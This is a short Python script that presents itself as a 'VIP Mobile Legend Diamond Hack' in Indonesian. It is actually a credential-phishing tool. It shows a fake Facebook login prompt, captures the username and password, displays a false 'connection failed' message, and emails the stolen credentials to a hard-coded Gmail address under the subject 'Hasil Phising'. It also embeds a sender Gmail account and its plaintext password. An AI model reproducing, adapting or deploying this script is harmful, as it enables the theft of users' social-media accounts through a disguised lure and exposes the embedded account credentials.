# -*- coding: utf-8 -*-
# coding=utf-8
# Decrypt By X - MrG3P5
import socket
import struct
import os
import sys
import time
import yagmail

x=yagmail.SMTP('akuntes270@gmail.com','watumalangzone11032002')

subject='Hasil Phising'

banner = """

.-..-.      .-.    _ .-.               
: `' :      : :   :_;: :               
: .. : .--. : `-. .-.: :   .--.        
: :; :' .; :' .; :: :: :_ ' '_.'       
:_;:_;`.__.'`.__.':_;`.__;`.__.'       
                                       
                                       
.-.                              .-.   
: :                              : :   
: :    .--.  .--.  .--. ,-.,-. .-' :   
: :__ ' '_.'' .; :' '_.': ,. :' .; :   
:___.'`.__.'`._. ;`.__.':_;:_;`.__.'   
             .-. :                     
             `._.'                     
.---. .-..-.  .-..-.             .-.   
: .  :: `' :  : :; :             : :.-.
: :: :: .. :  :    : .--.   .--. : `'.'
: :; :: :; :  : :: :' .; ; '  ..': . `.
:___.':_;:_;  :_;:_;`.__,_;`.__.':_;:_;
                                                                             
\x1b[34m    VIP Mobile Legend Diamond Hack
\x1b[∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
\x1b[34m  Silahkan Lengkapi Data Berikut ini
\x1b[34m 
\x1b[34m  ~Gunakan data valid agar diamond bisa terkirim~
"""
def dm():
    print (banner)
    jml=input('jumlah diamond | Max 500 :')
    sure=input('yakin? ya/tidak:')
    print (jml)
    print (sure)
	
def main():
	os.system('clear')
	print(banner)
	print('\x1b[00m\033[41m FACEBOOK LOGIN \033[00m')
	u=input('\x1b[00mUsername : \x1b[33m')
	p=input('\x1b[00mPassword : \x1b[33m')
	msg=('username : '+u+', password : '+p)
	body=(msg)
	print('')
	print('Sedang Login...')
	os.system('sleep 2')
	print('\x1b[00mSorry, connection failed\x1b[91m !\x1b[00m')
	print('\x1b[33mPlease try again later ...')
	os.system('sleep 3')
	print('')
	print('\x1b[00mExiting program \x1b[91m!')
	os.system('exit')
	x.send('ariefrobby5@gmail.com',subject,body)

dm()
main()

